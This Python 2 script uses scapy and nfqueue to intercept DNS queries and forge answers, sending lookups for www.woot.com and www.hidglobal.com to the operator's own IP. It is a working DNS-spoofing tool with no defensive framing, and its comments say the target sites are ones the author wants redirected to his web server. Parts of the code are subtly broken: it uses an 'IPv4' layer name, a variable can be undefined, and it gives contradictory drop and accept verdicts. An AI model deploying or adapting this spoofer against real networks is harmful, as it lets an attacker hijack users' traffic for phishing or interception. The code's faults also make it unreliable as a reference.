from multiprocessing import Process
import os,sys,nfqueue,socket,copy
# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


conf.verbose  = 0
conf.L3socket = L3RawSocket

class Filter(object):

	def make_dns_response(self,  request,  spoof_ip):               
		dns_rr = DNSRR(rrname=request.qd.qname,  ttl=900,  type= 'A',  rclass='IN',  rdata=spoof_ip)
		# dns_rr = DNSRR(rrname=request.qd.qname,  ttl=220,  type= 1,  rdlen=4,  rdata=spoof_ip) old                                
		response = DNS(id=request.id,  qr=1L, rd=1, ra=1, qdcount=1,  ancount=1,  qd=request.qd,  an=dns_rr)
		return response

	def redirect(self, pkt):
		print pkt[DNS].qd.qname + " redirecting to: "+self.local_ip
		if pkt[DNS].qd.qtype == 1:
			try:
				response = self.make_dns_response(pkt[DNS],  self.local_ip)  
				p = IPv4(src=pkt[IPv4].dst, dst=pkt[IPv4].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
			except:
				p = None                                                                                             

		if p:
			print "sending fake dns"
			send(p,  verbose=0)                             
			return


	# def add_url_to_list(self, url):
	# 	ipaddr = socket.gethostbyname(url)
	# 	self.blocked_list[ipaddr] = url

	# def check_if_in_list(self, ipaddr):
	# 	if ipaddr in self.blocked_list:
	# 		return True
	# 	return False

	# def check_if_in_list(self, ipaddr): 
	# 	if ipaddr in self.blocked_list:    
	# 		return True
	# 	return False

	def filter_pkt(self, payload):
		data = payload.get_data()
		pkt = IP(data)

		if pkt.getlayer(DNS) and pkt[DNS].qd and not pkt[DNS].an:
			print pkt[DNS].qd.qname
			if pkt[DNS].qd.qname in self.redirect_list:
				self.redirect(pkt)
				payload.set_verdict(nfqueue.NF_DROP)

		# check if packet destination or source is in blocked list
		# if self.check_if_in_list(pkt[IP].dst):
		#   payload.set_verdict(nfqueue.NF_DROP)
		# elif self.check_if_in_list(pkt[IP].src):
		#   payload.set_verdict(nfqueue.NF_DROP)
		# else:
		payload.set_verdict(nfqueue.NF_ACCEPT)


	# def renew_ip_list(self):
	# 	tmpdict = {}
	# 	for key in self.blocked_list:
	# 		url = self.blocked_list[key]
	# 		tmpdict[socket.gethostbyname(url)] = url
	# 	self.blocked_list = copy.deepcopy(tmpdict)

	def go(self):
		self.q = nfqueue.queue()
		self.q.open()
		self.q.bind(socket.AF_INET)
		self.q.set_callback(self.filter_pkt)
		self.q.create_queue(0)
		self.q.try_run()

	def __init__(self, local_ip):
		self.local_ip = local_ip

		# not being used right now
		self.blocked_list = {'75.101.146.4': "www.woot.com", '75.101.146.4': "woot.com"} #  format of dictionary is  list= {'ipaddress': url}
		
		# just some random sites I want redirected to my web server
		self.redirect_list = {"www.hidglobal.com.","www.woot.com."}
		# poor woot, getting hated on by default
		self.p = Process(target=self.go)
		# self.renew_ip_list() # just call this right off the start
		

	def run(self):
		self.p.start()